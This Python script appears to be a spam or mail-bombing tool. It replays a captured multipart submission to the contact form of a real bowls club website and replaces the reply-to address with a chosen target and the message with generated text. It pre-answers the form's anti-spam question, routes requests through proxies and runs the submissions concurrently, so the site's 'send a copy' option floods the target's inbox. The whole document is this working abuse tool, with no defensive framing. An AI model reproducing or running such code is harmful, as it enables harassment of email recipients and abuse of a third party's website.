from os.path import basename

import requests

from module import Spam

cookies = {
    '289636605c79de434927b2efa36bd4a7': '4coje1t4p1lhp0a3jnkjlaadgj',
}

headers = {
    'authority': 'www.bairnsdalebowls.com.au',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryfpkpIesa5uBgfHhr',
    'origin': 'https://www.bairnsdalebowls.com.au',
    'referer': 'https://www.bairnsdalebowls.com.au/contactform',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    'connection': 'keep-alive'
}

params = {
    'option': 'com_rapidcontactex',
    'task': 'ajax.post',
    't': '0.6695455799700882',
}

s = 'success'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryfpkpIesa5uBgfHhr\r\nContent-Disposition: form-data; name="rpx_1rpx__User_Name_"\r\n\r\nfield\r\n------WebKitFormBoundaryfpkpIesa5uBgfHhr\r\nContent-Disposition: form-data; name="rpx_1rpx__Reply-To_Email_"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryfpkpIesa5uBgfHhr\r\nContent-Disposition: form-data; name="rpx_1rpx__Message_Subject_"\r\n\r\nfield\r\n------WebKitFormBoundaryfpkpIesa5uBgfHhr\r\nContent-Disposition: form-data; name="rpx_1rpx_Message"\r\n\r\ntest\r\n------WebKitFormBoundaryfpkpIesa5uBgfHhr\r\nContent-Disposition: form-data; name="rpx_1rpx_anti_spam_answer"\r\n\r\n2\r\n------WebKitFormBoundaryfpkpIesa5uBgfHhr\r\nContent-Disposition: form-data; name="rpx_1rpx_copy"\r\n\r\nYes\r\n------WebKitFormBoundaryfpkpIesa5uBgfHhr\r\nContent-Disposition: form-data; name="form_id"\r\n\r\nrpx_1\r\n------WebKitFormBoundaryfpkpIesa5uBgfHhr\r\nContent-Disposition: form-data; name="rpx_1rpx_data"\r\n\r\nrpx_data\r\n------WebKitFormBoundaryfpkpIesa5uBgfHhr\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n1000000\r\n------WebKitFormBoundaryfpkpIesa5uBgfHhr\r\nContent-Disposition: form-data; name="rpx_1source"\r\n\r\nmodule\r\n------WebKitFormBoundaryfpkpIesa5uBgfHhr\r\nContent-Disposition: form-data; name="rpx_1source_id"\r\n\r\n498\r\n------WebKitFormBoundaryfpkpIesa5uBgfHhr--\r\n'
        text = self.get_text(False)
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', text)

        response = requests.post('https://www.bairnsdalebowls.com.au/index.php', params=params, cookies=cookies,
                                 headers=headers, data=data.encode(), proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
